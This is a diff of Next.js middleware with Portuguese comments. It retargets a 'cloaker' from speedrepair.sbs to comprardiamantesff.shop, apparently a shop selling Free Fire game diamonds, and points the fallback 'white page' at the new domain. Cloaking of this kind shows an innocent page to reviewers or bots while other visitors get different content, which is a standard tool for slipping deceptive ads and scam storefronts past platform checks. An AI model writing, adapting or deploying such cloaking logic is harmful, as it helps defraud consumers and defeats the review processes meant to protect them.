@@ -53,13 +53,13 @@ export async function middleware(request: NextRequest) {
     }
   }
   
-  // Verificar domínio - ativar cloaker para speedrepair.sbs
+  // Verificar domínio - ativar cloaker para comprardiamantesff.shop
   const hostname = request.headers.get('host') || ''
-  const isSpeedRepair = hostname.includes('speedrepair.sbs')
+  const isSpeedRepair = hostname.includes('comprardiamantesff.shop')
   
-  // CLOAKER ATIVADO para speedrepair.sbs
+  // CLOAKER ATIVADO para comprardiamantesff.shop
   if (!isSpeedRepair) {
-    console.log('🔓 [Cloaker] Domínio não é speedrepair.sbs - desativado')
+    console.log('🔓 [Cloaker] Domínio não é comprardiamantesff.shop - desativado')
     return NextResponse.next()
   }
   
@@ -306,7 +306,7 @@ export async function middleware(request: NextRequest) {
         console.log('⚠️ [Cloaker] Erro ao parsear JSON - usando fallback (white)')
         result = {
           type: 'white',
-          url: 'https://speedrepair.sbs/'
+          url: 'https://comprardiamantesff.shop/'
         }
       }
     } else {
@@ -314,7 +314,7 @@ export async function middleware(request: NextRequest) {
       // Fallback IGUAL ao PHP: se vazio, mostrar white page
       result = {
         type: 'white',
-        url: 'https://speedrepair.sbs/'
+        url: 'https://comprardiamantesff.shop/'
       }
     }
 
